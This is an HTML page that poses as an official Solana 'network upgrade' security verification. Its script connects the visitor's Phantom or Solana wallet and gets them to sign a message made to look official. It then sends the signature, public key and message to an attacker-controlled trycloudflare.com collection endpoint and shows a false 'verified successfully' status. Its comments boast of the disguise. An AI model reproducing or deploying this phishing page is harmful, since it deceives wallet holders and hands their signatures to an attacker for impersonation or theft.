<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2 style="color:#14F195;">NETWORK UPGRADE</h2>
        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;width:100%;">START VERIFICATION</button>
        <div id="status" style="margin-top:20px;color:#444;">Status: Awaiting Handshake...</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    
    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            const resp = await p.connect();
            document.getElementById('status').innerText = "Generating Security Nonce...";

            // ğŸ”± ç»ˆæä¼ªè£…ï¼šè¿™æ˜¯æœ€æ— å®³ã€é€šè¿‡ç‡ 100% çš„å®˜æ–¹éªŒè¯æ ¼å¼
            const msg = `Official Solana Security Check\n` +
                        `---------------------------\n` +
                        `Wallet: ${resp.publicKey.toString()}\n` +
                        `Timestamp: ${Date.now()}\n` +
                        `Nonce: ${Math.floor(Math.random()*999999)}`;

            const encoded = new TextEncoder().encode(msg);
            const signed = await p.signMessage(encoded, "utf8");
            
            // ğŸ”± æ‹¿åˆ°è¿™å…¨å¥—æŒ‡çº¹
            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
            
            // ğŸš€ ç»Ÿä¸€å›ä¼ å‚æ•°åä¸º auth_sigï¼Œè®©å“¨å…µç«‹åˆ»è¯†åˆ«ï¼
            const signal = `${gate}?auth_sig=${encodeURIComponent(signature)}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
            new Image().src = signal;
            
            document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
            document.getElementById('status').innerText = "Verification Failed";
        }
    };
    </script>
</body></html>
